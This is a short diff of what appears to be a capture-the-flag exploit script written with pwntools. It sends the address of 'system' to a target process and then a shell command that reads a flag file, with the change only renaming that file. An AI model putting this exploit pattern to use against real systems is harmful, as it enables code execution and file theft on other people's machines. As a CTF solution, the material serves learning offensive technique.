@@ -57,7 +57,7 @@ p.sendline(str(system))
 #payload += p64(system)
 
 
-p.sendline(b"cat flag.txt")
+p.sendline(b"cat we_kind_thought_leaking_this_was_gonna_be_another_chall_flag.txt")
 print(p.recv(420).replace(b'\n',b''))
 #p.interactive()
 
